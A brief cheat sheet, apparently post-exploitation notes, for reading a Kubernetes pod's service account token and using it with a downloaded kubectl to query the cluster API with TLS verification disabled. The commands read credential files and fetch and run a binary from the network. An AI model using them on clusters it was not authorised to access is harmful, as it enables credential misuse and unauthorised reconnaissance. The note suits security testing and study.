# Service Account Token
cat /run/secrets/kubernetes.io/serviceaccount/token

# K8s client - From inside a pod
```
arch=$(uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g')
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/$arch/kubectl"
ls -l kubectl
mv kubectl /var/tmp/kubectl
chmod +x /var/tmp/kubectl
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /var/tmp/token
/var/tmp/kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /var/tmp/token) get pods
```